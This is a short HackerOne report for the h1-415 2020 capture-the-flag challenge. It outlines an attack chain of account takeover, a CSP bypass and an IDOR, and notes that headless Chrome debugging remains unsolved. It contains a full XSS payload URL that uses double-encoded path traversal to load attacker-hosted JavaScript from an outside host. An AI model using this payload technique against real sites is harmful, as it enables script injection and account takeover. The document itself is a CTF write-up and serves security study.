# [h1-415 2020] Spent a week and failed at solving the last step.

## Report Details
- **Report ID**: 781265
- **URL**: https://hackerone.com/reports/781265
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-01-23T05:07:37.816Z
- **Disclosed**: 2020-02-04T00:17:33.360Z

## Reporter
- **Username**: s1r1u5
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
## Summary:

I found something interesting  with Headless chrome debugging in the last step, I am sure I am going to solve this after trying very hard for about a week, I don't know when this CTF is going to end, that's why I am submitting a summary of how to solve this so that I can write the full report after fully solving the final step.

1. ATO of jobert's account using jobert@mydocz.cosmic
2. CSP bypass using URL double encoding. `https://h1-415.h1ctf.com/support/chat?message=%3Cscript%20type=%22text/javascript%22%20src=%22https://raw.githack.com/mattboldt/typed.js/master/lib/typed.js/..%252f..%252f..%252f..%252f..%252fInvaders0/xss/81faa59004ebeee525502d38b302445be93a2131/as.js%22%3E%3C/script%3E`
3. IDOR to  update the name at review. ```http://localhost:3000/support/review/c9b46d365357148bcd2436bc5d7fc19f27268010e91cd271b6531f8dff6824dc```
4. Headless chrome debugging enabled (have to solve).

## Impact

.

## Attachments
No attachments
